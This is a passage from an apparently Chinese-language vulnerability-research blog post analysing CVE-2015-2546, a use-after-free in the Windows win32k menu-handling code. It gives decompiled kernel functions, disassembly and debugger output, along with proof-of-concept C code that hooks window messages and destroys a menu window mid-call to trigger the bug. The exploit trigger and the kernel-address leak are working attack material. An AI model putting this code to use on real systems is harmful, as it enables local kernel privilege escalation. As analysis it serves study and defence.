&amp;&amp; !tagPopupMenu )</div><div class="line">               <span class="built_in"> goto </span><span class="class">LABEL_22;</span></div><div class="line">             <span class="built_in"> if </span>( (*v3 &amp; 2) != 0 &amp;&amp; v13 == -5 )</div><div class="line">              &#123;</div><div class="line">                xxxMNSwitchToAlternateMenu(v3);</div><div class="line">                v13 = -1;</div><div class="line">              &#125;</div><div class="line">             <span class="built_in"> if </span>( v13 == -1 )</div><div class="line">                xxxMNButtonDown(v3, v12, tagPopupMenu, 1);</div><div class="line">              else                              // 可能为-5</div><div class="line">                xxxSendMessage(v13, 0x1ED, tagPopupMenu, 0);// &lt;------CVE-2014-4113</div><div class="line">             <span class="built_in"> if </span>( (v12[1] &amp; 0x100) == 0 )</div><div class="line">                xxxMNRemoveMessage(tagMsg-&gt;message, 516);</div><div class="line">LABEL_127:</div><div class="line">             <span class="built_in"> if </span>( !pMenuStatea )</div><div class="line">               <span class="built_in"> return </span>1;</div><div class="line">             <span class="built_in"> goto </span><span class="class">LABEL_142;</span></div><div class="line">            &#125;</div><div class="line">           <span class="built_in"> return </span>0;</div><div class="line">          &#125;</div><div class="line">LABEL_58:                                       // message  == 0x200(WM_MOUSEMOVE)</div><div class="line">          v24 = pMenuState[1];                  // 条件1&lt;------CVE-2015-2546</div><div class="line">         <span class="built_in"> if </span>( (v24 &amp; 0x400) != 0 &amp;&amp; (v24 &amp; 8) != 0 &amp;&amp; (v24 &amp; 0xC0) == 0 )</div><div class="line">          &#123;</div><div class="line">           <span class="built_in"> if </span>( pMenuState[11] )</div><div class="line">            &#123;</div><div class="line">              v38[0] = pMenuState[9];</div><div class="line">              v38[1] = pMenuState[10];</div><div class="line">              v38[2] = pMenuState[9];</div><div class="line">              v38[3] = pMenuState[10];</div><div class="line">              InflateRect(v38, *(gpsi + 1760), *(gpsi + 1764));</div><div class="line">             <span class="built_in"> if </span>( !PtInRect(v38, v7, SHIWORD(v7)) )</div><div class="line">              &#123;</div><div class="line">                v25 = GetMenuStateWindow(pMenuState);</div><div class="line">               <span class="built_in"> if </span>( v25 )</div><div class="line">                &#123;</div><div class="line">                  pMenuState[1] |= 0x80u;</div><div class="line">                  _PostMessage(v25, 500, 0, 0);</div><div class="line">                &#125;</div><div class="line">              &#125;</div><div class="line">            &#125;</div><div class="line">          &#125;</div><div class="line">          xxxMNMouseMove(v3, pMenuState, v7);   // &lt;----CVE-2015-2546</div><div class="line">         <span class="built_in"> return </span>1;</div><div class="line">        &#125;</div><div class="line">       <span class="built_in"> goto </span><span class="class">LABEL_27;</span></div><div class="line">      &#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>win32k!xxxMNMouseMove</code>作用是处理鼠标移动的消息,首先判断传入的PopupMenu对象是否是根弹出菜单对象，然后检查坐标是否发生移动，继而通过<code>xxxMNFindWindowFromPoint(ppopupmenu, &amp;cmdItem, *&amp;ptScreen_);</code>获取菜单窗口对象。如果是有效的菜单窗口对象，会判断该窗口对象是否被销毁，然后将获取到的窗口对象作为参数，传入<code>xxxSendMessage</code>发送<code>MN_SELECTITEM(0x1E5)</code>消息以选择菜单项，当返回的uFlag为<code>MF_POPUP</code>以及不为<code>MFS_GRAYED</code>，并且调用<code>xxxSendMessage</code>发送<code>MN_SETTIMERTOOPENHIERARCHY</code>消息不为0的时候，则调用<code>xxxMNHideNextHierarchy</code>函数以关闭弹出窗口的子菜单。<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div></pre></td><td class="code"><pre><div class="line">void __stdcall xxxMNMouseMove(tagPOPUPMENU *cmdItem, tagMENUSTATE *pMenuState, POINTS ptScreen)</div><div class="line">&#123;</div><div class="line">  ppopupmenu = cmdItem;</div><div class="line">  if ( ppopupmenu == ppopupmenu-&gt;ppopupmenuRoot )<span class="comment">// tagPOPUPMENU 对象是否为当前的根弹出菜单对象</span></div><div class="line">  &#123;</div><div class="line">    ptScreen_ = ptScreen;</div><div class="line">    pMenuState_ = pMenuState;</div><div class="line">    if ( ptScreen.x != pMenuState-&gt;ptMouseLast.x || ptScreen.y != pMenuState-&gt;ptMouseLast.y ) <span class="comment">//检查坐标是否发生移动</span></div><div class="line">    &#123;</div><div class="line">      pMenuState-&gt;ptMouseLast.x = ptScreen.x;</div><div class="line">      pMenuState_-&gt;ptMouseLast.y = ptScreen_.y;</div><div class="line">      cmdHitArea = xxxMNFindWindowFromPoint(ppopupmenu, &amp;cmdItem, *&amp;ptScreen_);</div><div class="line">[...]</div><div class="line">      else                                      <span class="comment">// CVE-2015-2546条件3</span></div><div class="line">      &#123;</div><div class="line">        if ( cmdHitArea_1 == <span class="number">-1</span> )               <span class="comment">// if (cmdHitArea == MFMWFP_NOITEM) </span></div><div class="line">          goto LABEL_15;</div><div class="line">        if ( cmdHitArea_1 )                     <span class="comment">// 如果是菜单窗口对象的话</span></div><div class="line">                                                <span class="comment">// 条件2</span></div><div class="line">        &#123;</div><div class="line">          if ( IsWindowBeingDestroyed(cmdHitArea_1) )<span class="comment">// &lt;----CVE-2015-2546 返回为0即可</span></div><div class="line">            return;</div><div class="line">          v15 = *(gptiCurrent + <span class="number">45</span>);</div><div class="line">          *(gptiCurrent + <span class="number">45</span>) = &amp;v15;</div><div class="line">          v16 = cmdHitArea_1;</div><div class="line">          ++*(cmdHitArea_1 + <span class="number">4</span>);</div><div class="line">          v8 = *(pMenuState_ + <span class="number">1</span>);</div><div class="line">          popupmenu_ = *(cmdHitArea_1 + <span class="number">0xB0</span>);</div><div class="line">          if ( (v8 &amp; <span class="number">0x100</span>) != <span class="number">0</span> &amp;&amp; (v8 &amp; <span class="number">0x8000</span>) == <span class="number">0</span> &amp;&amp; (*popupmenu_ &amp; <span class="number">0x100000</span>) == <span class="number">0</span> )<span class="comment">// </span></div><div class="line">                                                <span class="comment">// if (pMenuState-&gt;fModelessMenu</span></div><div class="line">                                                <span class="comment">//     &amp;&amp; !pMenuState-&gt;fInDoDragDrop</span></div><div class="line">                                                <span class="comment">//     &amp;&amp; !ppopup-&gt;fTrackMouseEvent)</span></div><div class="line">          &#123;</div><div class="line">            v14 = *cmdHitArea_1;</div><div class="line">            v13 = <span class="number">2</span>;</div><div class="line">            TrackMouseEvent(&amp;v12);</div><div class="line">            *popupmenu_ |= <span class="number">0x100000</span>u;</div><div class="line">            xxxSendMessage(cmdHitArea_1, <span class="number">0x20</span>, *cmdHitArea_1, <span class="number">2</span>);</div><div class="line">          &#125;</div><div class="line">          v10 = xxxSendMessage(cmdHitArea_1, <span class="number">0x1E5</span>, cmdItem, <span class="number">0</span>);<span class="comment">// MN_SELECTITEM</span></div><div class="line">          if ( (v10 &amp; <span class="number">0x10</span>) != <span class="number">0</span> &amp;&amp; (v10 &amp; <span class="number">3</span>) == <span class="number">0</span> &amp;&amp; !xxxSendMessage(cmdHitArea_1, <span class="number">0x1F0</span>, <span class="number">0</span>, <span class="number">0</span>) )<span class="comment">// MN_SETTIMERTOOPENHIERARCHY</span></div><div class="line">            xxxMNHideNextHierarchy(popupmenu_); <span class="comment">// &lt;-----CVE-2015-5246 通过人为构造内存进行触发</span></div><div class="line">          goto LABEL_28;</div><div class="line">        &#125;</div><div class="line">      &#125;</div><div class="line">[...]</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>xxxMNHideNextHierarchy</code>函数逻辑就很简单了，只需要判断传入的ppopupmenu的弹出子菜单是否是活跃的弹出菜单之后，调用<code>xxxSendMessage</code>发送<code>MN_CLOSEHIERARCHY</code>消息关闭弹出菜单。然后接着发送<code>MN_SELECTITEM</code>消息继续选择菜单。<br><figure class="highlight zephir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">BOOL</span> xxxMNHideNextHierarchy(</div><div class="line">    PPOPUPMENU ppopup)</div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (ppopup-&gt;spwndNextPopup != <span class="keyword">NULL</span>) &#123;</div><div class="line">[...]</div><div class="line">        <span class="keyword">if</span> (ppopup-&gt;spwndNextPopup != ppopup-&gt;spwndActivePopup)</div><div class="line">            xxxSendMessage(ppopup-&gt;spwndNextPopup, MN_CLOSEHIERARCHY, <span class="number">0</span>, <span class="number">0</span>L);</div><div class="line">        xxxSendMessage(ppopup-&gt;spwndNextPopup, MN_SELECTITEM, (WPARAM)<span class="number">-1</span>, <span class="number">0</span>L);</div><div class="line">        ThreadUnlock(&amp;tlpwndT);</div><div class="line">        <span class="keyword">return</span> <span class="keyword">TRUE</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">FALSE</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据上述对于<code>win32k!xxxHandleMenuMessages</code>描述，CVE-2015-2546和CVE-2014-4113漏洞都产生于<code>xxxHandleMenuMessages</code>。其不同点在于，CVE-2014-4113的message为WM_LBUTTONDOWN(0x201),而CVE-2015-2546的message为WM_MOUSEMOVE(0x200)。我们都可以复用CVE-2014-4113的poc代码如下。需要改动的地方就是主窗口的WndProc函数。需要其发送WM_MOUSEMOVE(0x200)消息，以使执行流进入<code>xxxMNMouseMove</code><br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div></pre></td><td class="code"><pre><div class="line">BOOL poc_cve_2015_2546()</div><div class="line">&#123;</div><div class="line"><span class="comment">//创建一个主窗口</span></div><div class="line">HWND        hWnd;</div><div class="line">WNDCLASS    wc;</div><div class="line">memset(&amp;wc, <span class="number">0</span>, sizeof(wc));</div><div class="line">wc.lpfnWndProc = WndProc;</div><div class="line">wc.lpszClassName = <span class="string">"CVE-2015-2546"</span>;</div><div class="line">RegisterClassA(&amp;wc);</div><div class="line">hWnd = CreateWindowExA(<span class="number">0</span>, wc.lpszClassName, <span class="number">0</span>, <span class="number">0</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</div><div class="line">if (hWnd == NULL)</div><div class="line">&#123;</div><div class="line">return <span class="literal">FALSE</span>;</div><div class="line">&#125;</div><div class="line">PTHRDESKHEAD thrdeskhead_wnd = pHmValidateHandle(hWnd, <span class="number">1</span>);</div><div class="line">PVOID tagWnd = thrdeskhead_wnd-&gt;pSelf;</div><div class="line">printf(<span class="string">"[+] tagWnd in Kernel Address : 0x%p<span class="subst">\n</span>"</span>, tagWnd);</div><div class="line"><span class="comment">//创建一个菜单，并插入</span></div><div class="line">HMENU MenuOne = CreatePopupMenu();</div><div class="line">MENUITEMINFOA MenuOneInfo = &#123; <span class="number">0</span> &#125;;</div><div class="line">MenuOneInfo.cbSize = sizeof(MENUITEMINFOA);</div><div class="line">MenuOneInfo.fMask = MIIM_STRING;</div><div class="line">BOOL insertMenuItem = InsertMenuItemA(MenuOne, <span class="number">0</span>, <span class="literal">TRUE</span>, &amp;MenuOneInfo);</div><div class="line"><span class="comment">//创建第二个菜单，并插入</span></div><div class="line">HMENU MenuTwo = CreatePopupMenu();</div><div class="line">MENUITEMINFOA MenuTwoInfo = &#123; <span class="number">0</span> &#125;;</div><div class="line">MenuTwoInfo.cbSize = sizeof(MENUITEMINFOA);</div><div class="line">MenuTwoInfo.fMask = (MIIM_STRING | MIIM_SUBMENU);</div><div class="line">MenuTwoInfo.hSubMenu = MenuOne;</div><div class="line">MenuTwoInfo.dwTypeData = (LPSTR)<span class="string">""</span>;</div><div class="line">MenuTwoInfo.cch = <span class="number">1</span>;</div><div class="line">insertMenuItem = InsertMenuItemA(MenuTwo, <span class="number">0</span>, <span class="literal">TRUE</span>, &amp;MenuTwoInfo);</div><div class="line"><span class="comment">//设置消息钩子</span></div><div class="line">HHOOK setWindowsHook = SetWindowsHookExA(WH_CALLWNDPROC, WndProcHook, NULL, GetCurrentThreadId());</div><div class="line"><span class="comment">//触发漏洞</span></div><div class="line">TrackPopupMenu(</div><div class="line">MenuTwo,</div><div class="line"><span class="number">0</span>,</div><div class="line"><span class="number">0</span>,</div><div class="line"><span class="number">0</span>,</div><div class="line"><span class="number">0</span>,</div><div class="line">hWnd,</div><div class="line">NULL);</div><div class="line">return <span class="literal">TRUE</span>;</div><div class="line">&#125;</div><div class="line">[........]</div><div class="line">LRESULT CALLBACK WndProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)</div><div class="line">&#123;</div><div class="line">if (uMsg == WM_ENTERIDLE)</div><div class="line">&#123;</div><div class="line">PostMessageA(hWnd, WM_KEYDOWN, VK_DOWN, <span class="number">0</span>);</div><div class="line">PostMessageA(hWnd, WM_KEYDOWN, VK_RIGHT, <span class="number">0</span>);</div><div class="line">PostMessageA(hWnd, WM_MOUSEMOVE, <span class="number">0</span>, <span class="number">1</span>);</div><div class="line"><span class="comment">//PostMessageA(hwnd, WM_LBUTTONDOWN, 0, 0); CVE-2014-4113</span></div><div class="line">&#125;</div><div class="line">return DefWindowProcA(hWnd, uMsg, wParam, lParam);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">kd&gt; kn</div><div class="line"> # ChildEBP RetAddr      </div><div class="line"><span class="number">00</span> <span class="number">968</span>d7b90 <span class="number">95</span>ab7db0     win32k!xxxMNMouseMove</div><div class="line"><span class="number">01</span> <span class="number">968</span>d7bec <span class="number">95</span>aafa64     win32k!xxxHandleMenuMessages+<span class="number">0x2ed</span></div><div class="line"><span class="number">02</span> <span class="number">968</span>d7c38 <span class="number">95</span>abf71b     win32k!xxxMNLoop+<span class="number">0x2c6</span></div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在<code>xxxMNMouseMove</code>中，要触发漏洞，需要有4个条件,根据调试，第一个条件自动满足。</p><ul><li>1.tagPOPUPMENU 对象是否为当前的根弹出菜单对象</li><li>2.通过<code>xxxMNFindWindowFromPoint</code>获取到的窗口对象的有效性，即不能为-1，也不能为-5，且不能被销毁。</li><li>3.利用<code>xxxSendMessage</code>发送<code>MN_SELECTITEM</code>消息之后，返回的标志是<code>MF_POPUP</code>(弹出菜单)，以及不为<code>MFS_GRAYED</code>(禁用状态)</li><li>4.利用<code>xxxSendMessage</code>发送<code>MN_SETTIMERTOOPENHIERARCHY</code>消息返回值为0</li></ul><figure class="highlight hsp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/*</span></div><div class="line"><span class="comment"> * Select the item.</span></div><div class="line"><span class="comment"> */</span></div><div class="line">uFlags = (UINT)xxxSendMessage(pwnd, MN_SELECTITEM, (<span class="keyword">WPARAM</span>)cmdItem, <span class="number">0</span>L)<span class="comment">;</span></div><div class="line"><span class="keyword">if</span> ((uFlags &amp; MF_POPUP) &amp;&amp; !(uFlags &amp; MFS_GRAYED)) &#123;</div><div class="line">   <span class="comment">/*</span></div><div class="line"><span class="comment">    * User moved back onto an item with a hierarchy. Hide the</span></div><div class="line"><span class="comment">    * the dropped popup.</span></div><div class="line"><span class="comment">    */</span></div><div class="line">   <span class="keyword">if</span> (!xxxSendMessage(pwnd, MN_SETTIMERTOOPENHIERARCHY, <span class="number">0</span>, <span class="number">0</span>L)) &#123;</div><div class="line">        xxxMNHideNextHierarchy(ppopup)<span class="comment">;</span></div><div class="line">   &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;重点分析一下<code>xxxMNMouseMove</code>函数，CVE-2015-2546是一个UAF漏洞，漏洞本质如上所述，在执行<code>xxxSendMessage</code>执行流返回用户侧代码，销毁窗口对象pwnd，然后xxxMNHideNextHierarchy没有经过检查便使用了已经销毁的窗口对象pwnd。但是在此之前，调用<code>xxxMNFindWindowFromPoint</code>是要确保得到的对象有效性。所以，只能在发送<code>MN_SETTIMERTOOPENHIERARCHY</code>的时机去销毁。<br><figure class="highlight cs"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="function">VOID <span class="title">xxxMNMouseMove</span>(<span class="params"></span></span></div><div class="line"><span class="function"><span class="params">    PPOPUPMENU ppopup,</span></span></div><div class="line"><span class="function"><span class="params">    PMENUSTATE pMenuState,</span></span></div><div class="line"><span class="function"><span class="params">    POINTS ptScreen</span>)</span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">[<span class="meta">...</span>]</div><div class="line">    <span class="keyword">if</span> (!IsRootPopupMenu(ppopup)) &#123;</div><div class="line">        RIPMSG0(RIP_ERROR,</div><div class="line">            <span class="string">"MenuMouseMoveHandler() called for a non top most menu"</span>);</div><div class="line">        <span class="keyword">return</span>;</div><div class="line">    &#125;</div><div class="line">[<span class="meta">...</span>]</div><div class="line">    cmdHitArea = xxxMNFindWindowFromPoint(ppopup, &amp;cmdItem, ptScreen);</div><div class="line">[<span class="meta">...</span>]</div><div class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cmdHitArea != <span class="number">0</span>) &#123;</div><div class="line">[<span class="meta">...</span>]</div><div class="line">pwnd = (PWND)(cmdHitArea);</div><div class="line">        ppopup = ((PMENUWND)pwnd)-&gt;ppopupmenu;</div><div class="line">[<span class="meta">...</span>]</div><div class="line">        uFlags = (UINT)xxxSendMessage(pwnd, MN_SELECTITEM, (WPARAM)cmdItem, <span class="number">0</span>L);</div><div class="line">        <span class="keyword">if</span> ((uFlags &amp; MF_POPUP) &amp;&amp; !(uFlags &amp; MFS_GRAYED)) </div><div class="line">&#123;</div><div class="line">           <span class="keyword">if</span> (!xxxSendMessage(pwnd, MN_SETTIMERTOOPENHIERARCHY, <span class="number">0</span>, <span class="number">0</span>L)) </div><div class="line">&#123;</div><div class="line">                xxxMNHideNextHierarchy(ppopup);</div><div class="line">           &#125;</div><div class="line">        &#125;</div><div class="line">    &#125; </div><div class="line">[<span class="meta">...</span>]</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;所以，现在劫持的回调函数中，需要处理三种消息。编写的消息处理函数如下。<br><figure class="highlight hsp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">[+] MN_FINDMENUWINDOWFROMPOINT:只需要返回一个有效的窗口对象即可。</div><div class="line">[+] MN_SELECTITEM:只需要返回<span class="number">0</span>x3或者<span class="number">0</span>x10的标志即可。</div><div class="line">[+] MN_SETTIMERTOOPENHIERARCHY:首先，需要返回<span class="number">0</span>，然后还要销毁上面那个有效的窗口对象，以保证漏洞能被利用</div><div class="line"><span class="comment">//////////</span></div><div class="line">LRESULT CALLBACK NewWndProc(<span class="keyword">HWND</span> <span class="keyword">hWnd</span>, UINT uMsg, <span class="keyword">WPARAM</span> <span class="keyword">wParam</span>, <span class="keyword">LPARAM</span> <span class="keyword">lParam</span>)<span class="comment">//back default tagWnd will change!!!</span></div><div class="line">&#123;</div><div class="line">LPACCELlpAccel<span class="comment">;</span></div><div class="line"><span class="comment">// 处理 1EB 的消息</span></div><div class="line"><span class="keyword">if</span> (uMsg == MN_FINDMENUWINDOWFROMPOINT)</div><div class="line">&#123;</div><div class="line"><span class="keyword">return</span> (LONG)hWnd2<span class="comment">;</span></div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> <span class="keyword">if</span> (uMsg == MN_SETTIMERTOOPENHIERARCHY)</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span> (hWnd2 != NULL)</div><div class="line">&#123;</div><div class="line"><span class="comment">// #32768窗口进行销毁,tagPopupMenu被释放</span></div><div class="line">DestroyWindow(hWnd2)<span class="comment">;</span></div><div class="line">&#125;</div><div class="line"><span class="comment">// 返回值为0绕过判断</span></div><div class="line"><span class="keyword">return</span> <span class="number">0</span><span class="comment">;</span></div><div class="line">&#125;</div><div class="line"><span class="comment">// 处理 1E5 的消息,返回 0x10</span></div><div class="line"><span class="keyword">else</span> <span class="keyword">if</span> (uMsg == MN_SELECTITEM)</div><div class="line">&#123;</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>x10<span class="comment">;</span></div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> CallWindowProcA(lpPrevWndFunc, <span class="keyword">hWnd</span>, uMsg, <span class="keyword">wParam</span>, <span class="keyword">lParam</span>)<span class="comment">;</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当返回一个普通的窗口对象的时候，发现<code>IsWindowBeingDestroyed</code>过不去，这个问题，前辈已经解决，当创建一个”#32768”窗口对象即可。<br><figure class="highlight tcl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">text:<span class="number">95</span>ADEA1F     _IsWindowBeingDestroyed@<span class="number">4</span> <span class="keyword">proc</span><span class="title"> near</span>     ;<span class="title"> CODE</span> XREF:<span class="title"> ShouldComposeOrDecomposeWindow(x,x)+19↑p</span></div><div class="line"><span class="title">.text:95ADEA1F</span>                                             ;<span class="title"> _HungWindowFromGhostWindow(x)+17↑p</span> ...</div><div class="line">.text:95ADEA1F</div><div class="line">.text:95ADEA1F<span class="title">     arg_0</span>           =<span class="title"> dword</span> ptr  8</div><div class="line">.text:95ADEA1F</div><div class="line">.text:95ADEA1F 000<span class="title">                 mov</span> <span class="title">    edi,</span> edi</div><div class="line">.text:95ADEA21 000<span class="title">                 push</span> <span class="title">   ebp</span></div><div class="line"><span class="title">.text:95ADEA22</span> 004<span class="title">                 mov</span> <span class="title">    ebp,</span> esp</div><div class="line">.text:95ADEA24 004<span class="title">                 mov</span> <span class="title">    edx,</span> [ebp+8]</div><div class="line">.text:95ADEA27 004<span class="title">                 push</span> <span class="title">   esi</span></div><div class="line"><span class="title">.text:95ADEA28</span> 008<span class="title">                 push</span> <span class="title">   edx</span>             ;<span class="title"> a1</span></div><div class="line"><span class="title">.text:95ADEA29</span> 00C<span class="title">                 xor</span> <span class="title">    esi,</span> esi</div><div class="line">.text:95ADEA2B 00C<span class="title">                 call</span> <span class="title">   _IsWindowDestroyed@4</span> ;<span class="title"> IsWindowDestroyed(x)</span></div><div class="line"><span class="title">.text:95ADEA30</span> 008<span class="title">                 test</span> <span class="title">   eax,</span> eax</div><div class="line">.text:95ADEA32 008<span class="title">                 jnz</span> <span class="title">    short</span> loc_95ADEA55</div><div class="line">.text:95ADEA34 008<span class="title">                 test</span> <span class="title">   byte</span> ptr [edx+18h], 80h ;<span class="title"> tagWND-&gt;bInDestroy</span></div><div class="line"><span class="title">.text:95ADEA38</span> 008<span class="title">                 jnz</span> <span class="title">    short</span> loc_95ADEA55</div><div class="line">.text:95ADEA3A 008<span class="title">                 mov</span> <span class="title">    eax,</span> 8000h</div><div class="line">.text:95ADEA3F 008<span class="title">                 test</span>    [edx+2Ah],<span class="title"> ax</span></div><div class="line"><span class="title">.text:95ADEA43</span> 008<span class="title">                 jnz</span> <span class="title">    short</span> loc_95ADEA55</div><div class="line">.text:95ADEA45 008<span class="title">                 mov</span> <span class="title">    edx,</span> [edx+8]</div><div class="line">.text:95ADEA48 008<span class="title">                 test</span> <span class="title">   edx,</span> edx</div><div class="line">.text:95ADEA4A 008<span class="title">                 jz</span> <span class="title">     short</span> loc_95ADEA58</div><div class="line">.text:95ADEA4C 008<span class="title">                 test</span> <span class="title">   byte</span> ptr [edx+0D8h], 1</div><div class="line">.text:95ADEA53 008<span class="title">                 jz</span> <span class="title">     short</span> loc_95ADEA58</div><div class="line">.text:95ADEA55</div><div class="line">.text:95ADEA55<span class="title">     loc_95ADEA55:</span>                           ;<span class="title"> CODE</span> XREF:<span class="title"> IsWindowBeingDestroyed(x)+13↑j</span></div><div class="line"><span class="title">.text:95ADEA55</span>                                             ;<span class="title"> IsWindowBeingDestroyed(x)+19↑j</span> ...</div><div class="line">.text:95ADEA55 008<span class="title">                 xor</span> <span class="title">    esi,</span> esi</div><div class="line">.text:95ADEA57 008<span class="title">                 inc</span> <span class="title">    esi</span></div><div class="line"><span class="title">.text:95ADEA58</span></div><div class="line"><span class="title">.text:95ADEA58</span> <span class="title">    loc_95ADEA58:</span>                           ;<span class="title"> CODE</span> XREF:<span class="title"> IsWindowBeingDestroyed(x)+2B↑j</span></div><div class="line"><span class="title">.text:95ADEA58</span>                                             ;<span class="title"> IsWindowBeingDestroyed(x)+34↑j</span></div><div class="line"><span class="title">.text:95ADEA58</span> 008<span class="title">                 mov</span> <span class="title">    eax,</span> esi</div><div class="line">.text:95ADEA5A 008<span class="title">                 pop</span> <span class="title">    esi</span></div><div class="line"><span class="title">.text:95ADEA5B</span> 004<span class="title">                 pop</span> <span class="title">    ebp</span></div><div class="line"><span class="title">.text:95ADEA5C</span> 000<span class="title">                 retn</span>    4</div><div class="line">.text:95ADEA5C<span class="title">     _IsWindowBeingDestroyed@4</span> endp</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在调试器中，获取弹出菜单对象Popupmenu的地址为0xfe78d9a8，然后当执行完<code>xxxSendMessage(cmdHitArea_1, MN_SETTIMERTOOPENHIERARCHY, 0, 